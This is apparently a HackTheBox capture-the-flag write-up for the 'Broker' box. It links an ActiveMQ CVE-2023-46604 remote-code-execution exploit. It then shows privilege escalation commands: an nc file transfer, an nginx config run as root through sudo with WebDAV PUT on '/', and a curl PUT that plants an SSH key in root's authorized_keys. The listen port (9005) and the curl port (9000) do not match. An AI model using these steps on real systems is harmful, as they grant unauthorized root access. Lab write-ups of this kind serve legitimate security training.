## Broker box on htb

### Useful tools:
https://www.revshells.com/

### Obtaining user flag
https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
https://www.prio-n.com/blog/cve-2023-46604-attacking-defending-ActiveMQ

Once exploit delivered, just `cat /home/activemq/user.txt`

### Obtaining root flag
Used nginx which user had access to to start nginx server and allow PUT with WebDav

To open up a stream from local to remote with reverse shell:
```shell
# on remote
nc -l -p 1234 > nginx.conf

# on host
nc -w 3 broker.htb 1234 < nginx.conf
```

Custom config:

```json
# nginx.conf
user root;
events {
    worker_connections 512;
}
http {
  server {
    dav_methods PUT DELETE MKCOL COPY MOVE;
    listen 9005;
    root /;
    autoindex on;
  }
}
```

Start nginx server with custom config:
`sudo nginx -c $(realpath nginx.conf)`


## With nginx webdav method to put files:
`curl -X PUT -d "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIErzi80YYVjGdDF0K4f29cvtK3MTLy87WUNOXr6W5U3Y parallels@kali-gnu-linux-2023.2" http://broker.htb:9000/root/.ssh/authorized_keys`

Used local ssh key to transfer to box with nginx server running int othe root authorized keys.
